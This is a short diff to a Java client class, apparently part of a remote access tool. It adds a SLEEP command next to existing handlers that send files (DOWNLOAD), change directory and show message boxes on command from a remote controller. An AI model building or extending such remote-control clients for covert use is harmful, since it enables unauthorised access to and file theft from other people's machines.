@@ -150,6 +150,10 @@ public class Client {
                     directoryChange();
                 } else if (input.contains("DOWNLOAD")) {
                     sendFile();
+                } else if (input.contains("SLEEP")) {
+                    Thread.sleep(Long.parseUnsignedLong(input.split(" ")[1]) * 1000);
+                    communicate("SLEEP");
+                    if (debugMode){ System.out.println("Sleep over"); }
                 } else if (input.contains("MSGBOX")) {
                     String[] split = Arrays.copyOfRange(input.split(" "), 1, input.split(" ").length);
                     StringBuilder toSet = new StringBuilder();
